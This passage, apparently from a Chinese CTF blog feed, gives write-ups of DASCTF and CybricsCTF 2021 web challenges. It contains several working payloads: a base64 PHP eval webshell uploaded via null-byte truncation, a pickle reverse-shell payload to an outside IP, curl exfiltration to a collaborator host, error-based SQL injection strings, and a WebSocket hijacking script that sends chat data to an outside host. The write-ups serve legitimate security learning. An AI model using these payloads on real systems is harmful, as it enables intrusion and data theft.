&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Location: &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>file_put_contents()执行文件写入，内容可控+路径已知，过滤的点在于后缀名是bmp或png 并且只有除去后缀的这文件名可控，php版本是5.2.17，用00截断绕过（post部分要urlencode一下 burp或者hackbar就直接转了&lt;/p>
&lt;pre>&lt;code>/qbl.php?id=wuhu.php%00a&amp;amp;url=http://baidu.com
POST: img=data:image/png;base64,PD9waHAgQGV2YWwoJF9QT1NUWyd3dWh1J10pOyA/Pg==
&lt;/code>&lt;/pre>&lt;p>参考：&lt;a href="https://eastjun.top/2021/08/03/dasctf-july-x-cbctf-4th/">wp&lt;/a>&lt;/p>
&lt;h2 id="easyweb">easyweb&lt;/h2>
&lt;p>有一个docker的附件和一些源码&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805160437216.png" alt="image-20210805160437216">&lt;/p>
&lt;p>首页就是个白底黑字的Hello World，审下源码&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805160540313.png" alt="image-20210805160540313">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805160627110.png" alt="image-20210805160627110">&lt;/p>
&lt;p>直接打断点调试一下（因为这里涉及到session的调用 所以在.vscode中的launch.json处添加一个configuration: &lt;code>&amp;quot;justMyCode&amp;quot;: false&lt;/code>这样可以在调用堆栈处看到完整的调用情况&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805180835775.png" alt="image-20210805180835775">&lt;/p>
&lt;p>可以注意到每次刷新之后 session的值都会发生变化，调试的时候可以看到生成这个session时调用了dumps方法，所以这个题就是反序列化的套路啦&lt;/p>
&lt;p>payload有两种吧 反弹shell 或者构造post/get请求到自己可以接收到的平台上，也都是常规做法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/175.24.73.30/2333 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#39;).read()&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">,(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">,))&lt;/span> &lt;span style="color:#75715e">#reduce必须返回元组或字符串&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">hello_world&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;233&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;2333&amp;#34;&lt;/span>
&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;a&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">A&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">Response&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Hello World!&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>构造请求的话还是老朋友~~ burp collaborator~~&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl &lt;span style="color:#d88200">&amp;#34;xxxxxx.burpcollaborator.net/`readflag`&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>参考：&lt;a href="http://www.snowywar.top/wp-content/uploads/2021/08/%E9%AD%94%E6%B3%95%E5%B0%91%E5%A5%B3%E5%A4%A9%E5%9B%A2WriteUP.pdf">wp&lt;/a>&lt;/p>
&lt;h2 id="easyjava">easyjava&lt;/h2>
&lt;p>java 根本不会&lt;/p>
&lt;p>放个参考链接 溜了：&lt;a href="https://blog.csdn.net/solitudi/article/details/119322658?spm=1001.2014.3001.5501">wp1&lt;/a> &lt;a href="https://ha1c9on.top/2021/08/02/dasctf-2021-07/">wp2&lt;/a>&lt;/p>
&lt;hr>
&lt;p>最近在总结反序列化有关的东西，想把php, python, java的反序列化 做过的东西总结总结，但还是我想得太简单了 一个php的反序列化就有好多好多东西（装死）&lt;/p>
&lt;p>争取早收工吧，还有upload, xss, csrf, sqli&amp;hellip;&amp;hellip;等着总结 还有超级多东西要学要看&lt;/p>
&lt;p>学习好耶！σ`∀´)&lt;/p></description></item><item><title>CybricsCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/07/29/cybricsctf2021-wp/</link><pubDate>Thu, 29 Jul 2021 17:02:12 +0800</pubDate><guid>https://amiaaaz.github.io/2021/07/29/cybricsctf2021-wp/</guid><description>&lt;h2 id="mic-check-cyber-baby-50-pts">Mic Check (Cyber, Baby, 50 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
&lt;p>Those organizers are changing &lt;a href="https://cybrics.net/rules">game rules&lt;/a> all the time! There’s a flag there, and it’s not that easy to capture.&lt;/p>
&lt;p>&lt;strong>Also be sure to join &lt;a href="https://t.me/cybrics">@cybrics Telegram chat&lt;/a>&lt;/strong> for challenge-related announcements and contacting orgs in case all goes wrong&lt;/p>
&lt;p>&lt;strong>Added at 10:10 —&lt;/strong> looks like the little mic check trolling caused massive pain, I’ve untrolled the rules page :-) You can now copy-paste freely&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724194428638.png" alt="image-20210724194428638">&lt;/p>
&lt;h2 id="scanner-rebyc-baby-50-pts">Scanner (rebyC, Baby, 50 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Mikhail Driagunov (&lt;a href="https://t.me/aethereternity">@aethereternity&lt;/a>)&lt;/p>
&lt;p>Check out this cool new &lt;a href="https://scanner-cybrics2021.ctf.su/">&lt;strong>game&lt;/strong>&lt;/a>!&lt;/p>
&lt;p>I heard they serve flags at level 5.&lt;/p>
&lt;/blockquote>
&lt;p>不难，就是比较鸡贼 把好好的图片弄成犹抱琵琶半遮面&lt;/p>
&lt;p>首先用&lt;a href="https://gifsuper.com/">Gif Super&lt;/a>把帧间隔调为300ms，然后裁剪出中间有用的部分 放入&lt;a href="http://www.atoolbox.net/Tool.php?Id=979">GIF动态图片分解&lt;/a>中看结果 都有在线工具就很方便&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724202614568.png" alt="image-20210724202614568">&lt;/p>
&lt;p>所以这个破玩意到底是啥？猪？还是刺猬？
别的都还算正常吧 就是都不太像其实 有star, goose, flag, flower, ring, house, bone&amp;hellip;. 最后一个是二维码 比较麻烦&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724203314255.png" alt="image-20210724203314255">&lt;/p>
&lt;p>再稍微调整一下尺寸，扫描就行了&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724203713402.png" alt="image-20210724203713402">&lt;/p>
&lt;h2 id="rm--rfer-ctb-baby-166-pts">rm -rf’er (CTB, Baby, 166 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
&lt;p>Alarm! We accidentally did &lt;code>rm -rf /*&lt;/code> on a very important server. Now all that’s left is one shell session.&lt;/p>
&lt;pre>&lt;code>ssh rmrfer@178.154.210.26
Password: sa7Neiyi
&lt;/code>&lt;/pre>&lt;p>Rescue the &lt;strong>flag.txt&lt;/strong> file from one of the directories by only using your shell&lt;/p>
&lt;p>&lt;strong>Added at 13:45 —&lt;/strong> frequent question: yes, if you found &lt;code>flag.txt&lt;/code>, the flag is right there, in the open, as plain text. Just read it. If you’re not seeing the flag, try to find another method that will not hide info from you&lt;/p>
&lt;/blockquote>
&lt;p>这个题 emmmmm
只要ssh一连接就会自动执行&lt;code>rm -rf /*&lt;/code>的指令，当反应过来的时候系统已经删的连ls指令都不剩了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729003620922.png" alt="image-20210729003620922">&lt;/p>
&lt;p>先说非预期解吧：当输入连接密码后立刻ctrl+c 只要够快 就执行不了&lt;code>rm -rf /*&lt;/code>，之后就可以顺畅的穿梭于这个buildbox之间拿flag了&lt;/p>
&lt;p>预期解则是这样的：当系统执行删除命令后 很多外部指令都被删除 需要通过仅剩的一些内置函数完成&amp;quot;read&amp;quot;的功能；从之前的报错信息可知 buildbox使用的是tcsh，在tcsh中&lt;code>echo $&amp;lt;&lt;/code>命令相当于&lt;code>read&lt;/code>函数，读入标准输入并输出；tcsh中加括号的命令都会在子shell中运行；构造payload &lt;code>(echo &amp;quot;$&amp;lt;&amp;quot;) &amp;lt; /etc/ctf/flag.txt&lt;/code>，即 读取flag.txt并输出&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729005544665.png" alt="image-20210729005544665">&lt;/p>
&lt;h2 id="ad-network-web-baby-50-pts">Ad Network (Web, Baby, 50 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Alexander Menshchikov (&lt;a href="https://t.me/n0str">@n0str&lt;/a>)&lt;/p>
&lt;p>We are so tired of advertising on the internet. It feels like it breaks the internet. Try to follow the ad, try to follow its rules.&lt;/p>
&lt;p>&lt;a href="http://adnetwork-cybrics2021.ctf.su/">Adnetwork website&lt;/a>&lt;/p>
&lt;p>There is a flag 1337 redirects deep into the network&amp;hellip;&lt;/p>
&lt;/blockquote>
&lt;p>&lt;del>这个我是不知道怎么做……页面上的任何链接部分都是自己页面内的跳转，提示的是redirect重定向，可是抓包后没有302 也没有一直在做重定向呀 要怎么看呢？&lt;/del>&lt;/p>
&lt;p>emmmm 在比赛第二天再次尝试的时候用burp的自带的chromium的浏览器（之前是知道这个 但是没有用过）欸 页面左上角显示了一个gif图
这个图在昨天做的时候看到， 内容是 &lt;em>awesome ad from adnetwork&lt;/em>，但是edge浏览器在加载这个图的时候会自动阻止 我单独看了内容也没发现什么特别的 就没有注意这里。事后角度看这里 其实一个Gif图被阻止请求应该是很反常的事情，应该首先引起注意的&amp;hellip;&amp;hellip; &lt;del>（都怪edge!!!&lt;/del>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210725133924877.png" alt="image-20210725133924877">&lt;/p>
&lt;p>点击gif会有单独的弹窗出来，提示重定向次数过多；看burp中的抓包记录 确实多的离谱，按照题目中的提示 得有1337层，得上个脚本慢慢跑了 这个比较好弄&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210725134346221.png" alt="image-20210725134346221">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://adnetwork-cybrics2021.ctf.su/adnetwork&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">_&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">allow_redirects&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">18&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>emmm 比较慢其实 应该有别的的方式？最后的flag是 cybrics{f0lL0w_RUl3Z_F0ll0W_r3d1r3C7z}&lt;/p>
&lt;p>比赛完了看了别的wp 这块可以用session设允许重定向的次数，这样更方便&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Session&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">max_redirects&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1337&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://adnetwork-cybrics2021.ctf.su/adnetwork&amp;#34;&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">allow_redirects&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="announcement-web-easy-60-pts">Announcement (Web, Easy, 60 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Alexander Menshchikov (&lt;a href="https://t.me/n0str">@n0str&lt;/a>)&lt;/p>
&lt;p>Ladies and gentlemen!&lt;/p>
&lt;p>Allow us to introduce a brand new project —
⚐ The Flag&lt;/p>
&lt;p>&lt;a href="http://announcement-cybrics2021.ctf.su/">Announcement website&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>简约漂亮的前端&lt;/p>
&lt;p>有个输入邮箱的框，提交会发送一个post请求：digest=xxxx&amp;amp;email=xxxx
尝试一个1@1.com，重放的时候直接修改email值会提示Invalid digest，发现其中digest的值就是md5(&amp;lsquo;&lt;a href="mailto:1@1.com">1@1.com&lt;/a>&amp;rsquo;) 随email而改变，尝试注入&lt;/p>
&lt;pre>&lt;code>digest=76af11f3eaf7b12e72d7d88e4cf2ee01&amp;amp;email='or'1 // 回显正常 无报错
digest=c3593d255957d60d5d489ae682da8aee&amp;amp;email=1')# // 报错：Something went wrong during database insert: Column count doesn't match value count at row 1
digest=5c07c683d062d17ec799fa177ce88058&amp;amp;email=1',1)# // 报错：Something went wrong during database insert: Incorrect datetime value: '1' for column 'timestamp' at row 1
&lt;/code>&lt;/pre>&lt;p>确定是sqli 并且当前表有两列 email+timestamp，使用的语句应该是这个吧？&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#00a8c8">insert&lt;/span> &lt;span style="color:#00a8c8">into&lt;/span> &lt;span style="color:#00a8c8">table_name&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">email&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">timestamp&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">values&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">email&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">now&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>可利用的部分是可以插入的email，报错注入&lt;/p>
&lt;pre>&lt;code>digest=e1e79bd6fafe38f7073ec1f3ef1513fa&amp;amp;email=1',1 or updatexml(1,concat(0x7e,database()),0))# // Something went wrong during database insert: XPATH syntax error: '~announcement'
digest=c9f14624524736a74164cc6024fdefce&amp;amp;email=' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='announcement')),0) or ' // Something went wrong during database insert: XPATH syntax error: '~emails,logs'
digest=94707222b90505ab0aa5e1fd3916e77d&amp;amp;email=' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='announcement' and table_name='logs')),0) or ' // Something went wrong during database insert: XPATH syntax error: '~log'
digest=66bf6db11d9bee8e897b874a430f5704&amp;amp;email=' or updatexml(1,concat(0x7e,(select group_concat(log) from logs)),0) or ' // Something went wrong during database insert: XPATH syntax error: '~cybrics{1N53r7_0ld_900d_5ql}'
&lt;/code>&lt;/pre>&lt;p>没什么好说的，经典报错注入流程：确定字段数-&amp;gt;爆数据库名(announcement)-&amp;gt;表名(emails, logs)-&amp;gt;字段名(log)-&amp;gt;具体数据 拿flag&lt;/p>
&lt;h2 id="multichat-web-medium-138-pts">Multichat (Web, Medium, 138 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Alexander Menshchikov (&lt;a href="https://t.me/n0str">@n0str&lt;/a>)&lt;/p>
&lt;p>Yet another chat-messenger with rooms support! Free to use. Convince the admin that its code is insecure.&lt;/p>
&lt;p>Tip: Admin and tech support are members of a secret chat room. Tech support can ask admin to tell him the flag, to do that tech support writes him a message (in a chat): &amp;ldquo;&lt;code>Hey, i forgot the flag. Can you remind me?&lt;/code>&amp;rdquo;. Then admin will tell him the flag.&lt;/p>
&lt;p>&lt;a href="http://multichat-cybrics2021.ctf.su/">Multichat website&lt;/a>&lt;/p>
&lt;p>Team token for the support call: &lt;code>p32vhJKrnx_hajUc8nLTFw&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>聊天室，admin和tech support在一个秘密的聊天室内（10位数字的房间号），tech support可以让admin给出flag（后面那个team token for the support call是要用到吗还是怎么样&lt;/p>
&lt;p>抓包，看到了&lt;code>Connection: Upgrade&lt;/code> &lt;code>Upgrade: websocket&lt;/code>，这个聊天室是建立了一个websocket连接&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724225447805.png" alt="image-20210724225447805">（websocket这块知识印象中之前接触过一次 也就一次 相关链接还是放后面&lt;/p>
&lt;p>链接里的一个csrf攻击的实例跟这个有点像了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724232946228.png" alt="image-20210724232946228">&lt;/p>
&lt;p>但是这里的又不太一样，websocket最初建立时的http部分 cookie中有chatroom的id，这个值是未知的（&lt;em>Admin and tech support are members of a secret chat room.&lt;/em>）；另外tech support是先会发*‘Hey, i forgot the flag. Can you remind me?’*，需要的是触发（如果它不会自己发这一条内容的话）和监听它的信息 然后捕捉到它的下一条admin发送的内容，拿到flag&lt;/p>
&lt;p>（比赛的时候就想到这里，具体的实现不知道该怎么弄了，以下是看了wp之后的复现）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728001013129.png" alt="image-20210728001013129">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728001122843.png" alt="image-20210728001122843">&lt;/p>
&lt;p>5000端口处有Support页面，tech support在这里可以访问任意的页面并建立websocket发送消息，不限制跨域 所以可以将自己的网站写到这里，support会带着它的cookie（和admin在一个房间里 cookie是房间id）过来访问，然后借助js的脚本拿到它的cookie；以下是&lt;a href="https://mp.weixin.qq.com/s/SQ-DGvug-P6PK-s3qkJVdw">来自w&amp;amp;m的脚本&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">head&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">head&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;text/javascript&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">WebSocket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ws://multichat-cybrics2021.ctf.su/ws&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onclose&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">item&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">code&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#ae81ff">1003&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">item&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`Status: &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">reason&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">item&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Connection closed.&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">fetch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://api.chara.pub:1337/aaa.txt?&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">encodeURIComponent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">item&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onopen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">fetch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://api.chara.pub:1337/aaa.txt?&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">encodeURIComponent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;connected&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onmessage&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">fetch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://api.chara.pub:1337/aaa.txt?&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">encodeURIComponent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">};&lt;/span>
